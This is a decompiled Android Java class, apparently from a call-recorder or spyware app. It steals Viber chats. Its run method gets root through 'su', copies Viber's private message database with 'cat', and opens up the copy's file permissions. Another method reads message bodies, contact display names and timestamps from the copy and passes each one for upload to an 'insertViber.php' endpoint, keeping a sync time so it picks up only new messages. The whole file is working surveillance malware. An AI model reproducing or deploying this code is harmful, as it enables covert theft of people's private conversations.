package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import com.app.activity.MyApp;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;

/* compiled from: GetDataViber */
public class i extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f169b;

    /* renamed from: a reason: collision with root package name */
    private final Context f170a;

    public i(Context context) {
        this.f170a = context;
    }

    /* JADX WARNING: Removed duplicated region for block: B:103:0x01c2  */
    /* JADX WARNING: Removed duplicated region for block: B:56:0x0109 A[Catch:{ Exception -> 0x0111 }] */
    /* JADX WARNING: Removed duplicated region for block: B:57:0x010c A[Catch:{ Exception -> 0x0111 }] */
    /* JADX WARNING: Removed duplicated region for block: B:72:0x0132 A[Catch:{ Exception -> 0x016c }] */
    private void a(Context context, String str, long j) throws Exception {
        long j2;
        long j3;
        String str2;
        String str3;
        String str4;
        String str5;
        Cursor a2;
        String str6;
        String str7;
        String str8 = "conversation_id";
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context, a.c.e.c.a(), str);
        aVar.b();
        long j4 = j;
        Cursor h = aVar.h("messages", j4);
        if (h == null) {
            return;
        }
        if (h.getCount() <= 0) {
            a(aVar, h);
            return;
        }
        String str9 = "";
        long j5 = j4;
        String str10 = str9;
        String str11 = str10;
        long j6 = 0;
        while (h.moveToNext()) {
            Date date = new Date();
            try {
                j6 = h.getLong(h.getColumnIndexOrThrow("msg_date"));
                date.setTime(j6);
            } catch (Exception e2) {
                e2.getStackTrace();
                try {
                    e2.getStackTrace();
                    Crashlytics.logException(e2);
                } catch (Exception unused) {
                }
            }
            long j7 = j6;
            Date date2 = new Date();
            date2.setTime(e.u(context));
            Calendar instance = Calendar.getInstance();
            instance.setTime(date2);
            instance.add(13, 1);
            if (date.compareTo(instance.getTime()) > 0) {
                try {
                    str6 = h.getString(h.getColumnIndexOrThrow("body"));
                    if (str6 != null) {
                        try {
                            if (!str6.equals(str9)) {
                                str7 = str6;
                                str3 = str7;
                                str4 = h.getInt(h.getColumnIndexOrThrow("send_type")) == 0 ? "0" : "1";
                                a2 = aVar.a("participants", str8, h.getString(h.getColumnIndexOrThrow(str8)));
                                str5 = str9;
                                while (a2.moveToNext()) {
                                    try {
                                        Cursor a3 = aVar.a("participants_info", "_id", a2.getString(a2.getColumnIndexOrThrow("participant_info_id")));
                                        if (a3.getCount() > 0) {
                                            a3.moveToLast();
                                            StringBuilder sb = new StringBuilder();
                                            sb.append(str5);
                                            sb.append(a3.getString(a3.getColumnIndexOrThrow("display_name")));
                                            sb.append("<br/>");
                                            str5 = sb.toString();
                                        }
                                    } catch (Exception e3) {
                                        e = e3;
                                        try {
                                            e.getStackTrace();
                                            try {
                                                e.getStackTrace();
                                                Crashlytics.logException(e);
                                            } catch (Exception unused2) {
                                            }
                                            j3 = j5;
                                            str2 = str9;
                                            a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                                            j5 = j7;
                                            str10 = str3;
                                            str11 = str4;
                                            j6 = j7;
                                            str9 = str2;
                                        } catch (Exception e4) {
                                            e = e4;
                                            j3 = j5;
                                            e.getStackTrace();
                                            try {
                                                e.getStackTrace();
                                                Crashlytics.logException(e);
                                            } catch (Exception unused3) {
                                            }
                                            j2 = j3;
                                            if (j2 != 0) {
                                            }
                                            a(aVar, h);
                                        }
                                    }
                                }
                                j3 = j5;
                                str2 = str9;
                                a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                                j5 = j7;
                                str10 = str3;
                                str11 = str4;
                            }
                        } catch (Exception e5) {
                            e = e5;
                            e.getStackTrace();
                            try {
                                e.getStackTrace();
                                Crashlytics.logException(e);
                            } catch (Exception unused4) {
                            }
                            str3 = str6;
                            str4 = h.getInt(h.getColumnIndexOrThrow("send_type")) == 0 ? "0" : "1";
                            a2 = aVar.a("participants", str8, h.getString(h.getColumnIndexOrThrow(str8)));
                            str5 = str9;
                            while (a2.moveToNext()) {
                            }
                            j3 = j5;
                            str2 = str9;
                            a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                            j5 = j7;
                            str10 = str3;
                            str11 = str4;
                            j6 = j7;
                            str9 = str2;
                        }
                    }
                    try {
                        JSONArray jSONArray = new JSONArray(new JSONObject(new JSONObject(new JSONObject(h.getString(h.getColumnIndexOrThrow("msg_info"))).getString("pa_message_data")).getString("rich_media")).getString("Buttons"));
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append("<img src='");
                        sb2.append(jSONArray.getJSONObject(0).getString("BgMedia"));
                        sb2.append("'/>");
                        str7 = sb2.toString();
                    } catch (Exception e6) {
                        try {
                            e6.getStackTrace();
                            str7 = str9;
                        } catch (Exception e7) {
                            e = e7;
                            str6 = str9;
                            e.getStackTrace();
                            e.getStackTrace();
                            Crashlytics.logException(e);
                            str3 = str6;
                            str4 = h.getInt(h.getColumnIndexOrThrow("send_type")) == 0 ? "0" : "1";
                            a2 = aVar.a("participants", str8, h.getString(h.getColumnIndexOrThrow(str8)));
                            str5 = str9;
                            while (a2.moveToNext()) {
                            }
                            j3 = j5;
                            str2 = str9;
                            a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                            j5 = j7;
                            str10 = str3;
                            str11 = str4;
                            j6 = j7;
                            str9 = str2;
                        }
                    }
                    str3 = str7;
                } catch (Exception e8) {
                    e = e8;
                    str6 = str10;
                    e.getStackTrace();
                    e.getStackTrace();
                    Crashlytics.logException(e);
                    str3 = str6;
                    str4 = h.getInt(h.getColumnIndexOrThrow("send_type")) == 0 ? "0" : "1";
                    a2 = aVar.a("participants", str8, h.getString(h.getColumnIndexOrThrow(str8)));
                    str5 = str9;
                    while (a2.moveToNext()) {
                    }
                    j3 = j5;
                    str2 = str9;
                    a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                    j5 = j7;
                    str10 = str3;
                    str11 = str4;
                    j6 = j7;
                    str9 = str2;
                }
                try {
                    str4 = h.getInt(h.getColumnIndexOrThrow("send_type")) == 0 ? "0" : "1";
                } catch (Exception e9) {
                    e9.getStackTrace();
                    try {
                        e9.getStackTrace();
                        Crashlytics.logException(e9);
                    } catch (Exception unused5) {
                    }
                    str4 = str11;
                }
                try {
                    a2 = aVar.a("participants", str8, h.getString(h.getColumnIndexOrThrow(str8)));
                    str5 = str9;
                    while (a2.moveToNext()) {
                    }
                } catch (Exception e10) {
                    e = e10;
                    str5 = str9;
                    e.getStackTrace();
                    e.getStackTrace();
                    Crashlytics.logException(e);
                    j3 = j5;
                    str2 = str9;
                    a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                    j5 = j7;
                    str10 = str3;
                    str11 = str4;
                    j6 = j7;
                    str9 = str2;
                }
                j3 = j5;
                str2 = str9;
                try {
                    a(context, str5, str3, str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertViber.php");
                    j5 = j7;
                    str10 = str3;
                    str11 = str4;
                } catch (Exception e11) {
                    e = e11;
                    e.getStackTrace();
                    e.getStackTrace();
                    Crashlytics.logException(e);
                    j2 = j3;
                    if (j2 != 0) {
                    }
                    a(aVar, h);
                }
            } else {
                long j8 = j5;
                str2 = str9;
            }
            j6 = j7;
            str9 = str2;
        }
        j2 = j5;
        if (j2 != 0) {
            Editor edit = MyApp.b().getSharedPreferences("user", 0).edit();
            edit.putLong("timeviber", j2);
            edit.apply();
        }
        a(aVar, h);
    }

    public void run() {
        String str = "\n";
        String str2 = "Viber.db";
        try {
            Thread.sleep(4200);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f169b) {
            a(this.f170a);
            return;
        }
        f169b = true;
        try {
            if (e.u(this.f170a) == 0) {
                a.c.e.c.i(this.f170a);
            }
            if (e.u(this.f170a) != 0) {
                long u = e.u(this.f170a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.viber.voip/databases/");
                sb.append("viber_messages");
                sb.append(" > ");
                sb.append(a.c.e.c.a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a.c.e.c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f170a, str2, u);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f169b = false;
        a(this.f170a);
    }
}
